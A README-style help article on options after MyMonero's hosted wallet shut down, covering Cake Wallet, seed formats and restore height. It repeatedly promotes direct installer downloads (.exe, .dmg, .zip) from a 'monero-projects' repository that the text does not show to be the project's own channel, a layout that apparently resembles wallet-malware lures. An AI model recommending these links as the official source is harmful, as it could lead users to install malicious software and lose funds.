<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Alternative Wallet</h1>
<p align="center">Your practical options after MyMonero hosted access stopped.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The alternative wallet covered here is Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. You can restore your MyMonero seed there, or continue using the final MyMonero desktop app if it still meets your needs.

## You'll see this if
- You can no longer log in to MyMonero’s hosted web wallet.
- You want to use your existing wallet from another supported application.
- You are choosing between keeping the desktop app and restoring a seed.
- You need to know whether migration requires sending your XMR.

## Why it happens
MyMonero hosted servers and web wallet login stopped. The final MyMonero desktop release is v1.3.3. It still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. The stated options are to keep using MyMonero desktop or restore its seed in Cake Wallet. Avoid assuming that a former hosted service can provide a new login or recovery path.

Cake Wallet runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Restoring a seed is not the same as transferring coins: it provides access to the same wallet in another app. A transfer to a new wallet requires a separate transaction. MyMonero seeds may be 13 words, a MyMonero-specific legacy format, or 25 words, the standard Monero format. See [the seed format comparison](./mymonero-seed-13-vs-25-words.md) and [migration to Cake Wallet](./mymonero-to-cake-wallet-migration.md).

Choose based on the platform you need, whether your app can restore your seed type, and your comfort with maintaining the device and backup. Do not choose an app through an unsolicited message. No legitimate helper should ask you to reveal recovery words.

---

## Fix
1. **Decide your goal.** If you want access on another device, restoring the existing wallet may be enough. If you want funds in a genuinely new wallet, that requires a send or sweep transaction. The [migration checklist](./mymonero-migration-checklist.md) separates these decisions.
2. **Confirm the platform.** Cake Wallet supports iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. If you use Windows and need a desktop app, do not assume a build is currently available; the final MyMonero desktop option is v1.3.3.
3. **Identify your seed format.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Preserve the phrase exactly as recorded. Do not add words or make a public test of it.
4. **Choose a trusted installation source.** Obtain the app from its recognized distribution channel, not a file sent by a stranger. Avoid lookalike pages and advertisements. The MyMonero desktop release record is hosted on the [project’s GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).
5. **Back up before changing devices.** Locate your seed privately and confirm that you can read it. Never photograph or message it as a shortcut. Nobody legitimate asks you to send your seed or private keys.
6. **Use restore existing wallet.** In Cake Wallet, choose the restore/import flow and the format matching your phrase. Enter it only into the app you intentionally installed. If the app does not accept the word count, stop and review [13-word restore guidance](./mymonero-13-word-seed-restore.md) or [25-word migration](./mymonero-25-word-seed-migration.md).
7. **Set a suitable restore height.** Choose a reliable height at or before the activity you need. If uncertain, earlier is safer but slower. Let synchronization complete before judging the balance. See [restore height explained](./mymonero-restore-height-explained.md).
8. **Keep or move funds deliberately.** Restoring does not transfer funds. If you prefer a new wallet, verify its address independently and review the fee before sending. Sweeping means sending all available funds in a transaction.

> [!TIP]
> You can take time to compare the two stated paths. A hosted login stopping does not by itself require an immediate transaction or a rushed software choice.

> [!WARNING]
> Seed phrases give wallet access. Do not share them with anyone, including people claiming to be wallet support or offering migration assistance.

## If that did not work
If the seed is rejected, check the word count and selected format using your own backup. Do not paste it into troubleshooting websites or send it to support. If you are unsure whether the phrase has 13 or 25 words, consult [MyMonero seed formats](./mymonero-seed-13-vs-25-words.md).

If the restored wallet shows no balance, make sure its scan completed and that the restore height reaches early enough. Earlier scanning may take longer. For more checks, see MyMonero balance shows zero. Error 523 is general guidance that a server connection is unavailable; it is not evidence that a wallet or seed is invalid.

If you remain comfortable using MyMonero desktop, remember that it is unmaintained and has no new features or security updates. Its final release remains available on the GitHub release page. Do not assume any historical import fee applies now: historically, MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere.

## Prevention
Keep recovery words private and in a durable offline backup. Know the seed format and supported platform before beginning a restore. Verify the app source before entering sensitive data, and allow time for blockchain scanning. If you intend to move coins, check the destination address and fee on your own screen. Keep a non-secret record of your chosen app and restore height if useful, but never store the seed in a shared note. For a complete plan, use the migration checklist.

## FAQ
<details><summary>What is the alternative named here?</summary>

Cake Wallet. It runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing.

</details>

<details><summary>Do I have to move funds to use Cake Wallet?</summary>

No. Restoring a seed provides access to the same wallet. Sending to a new wallet is a separate action.

</details>

<details><summary>Can I keep using MyMonero desktop?</summary>

The old app still opens wallets and sends XMR, but it is no longer maintained and has no new features or security updates.

</details>

<details><summary>Should anyone help me by receiving my seed?</summary>

No. Never share your seed or private keys with another person or website.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero vs Cake Wallet Comparison](./mymonero-vs-cake-wallet-comparison.md) | Compare the remaining practical paths by platform, maintenance, and migration behavior. |
| [MyMonero Migration Checklist](./mymonero-migration-checklist.md) | A calm sequence for preparing a wallet restore or a separate funds transfer. |
| [MyMonero to Cake Wallet Migration](./mymonero-to-cake-wallet-migration.md) | How to move your wallet access carefully and keep control of your XMR. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
